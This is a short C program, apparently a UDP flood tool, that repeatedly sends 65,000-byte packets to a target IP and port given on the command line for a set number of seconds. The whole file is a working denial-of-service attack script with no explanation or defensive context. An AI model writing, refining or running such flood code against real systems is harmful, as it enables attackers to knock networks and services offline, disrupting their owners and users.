#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

void attack(char *target_ip, int port, int duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    unsigned char packet[65000];
    memset(packet, 0x90, sizeof(packet));
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sin, sizeof(sin));
    }
}
int main(int argc, char *argv[]) {
    if (argc != 4) return 0;
    attack(argv[1], atoi(argv[2]), atoi(argv[3]));
    return 0;
}

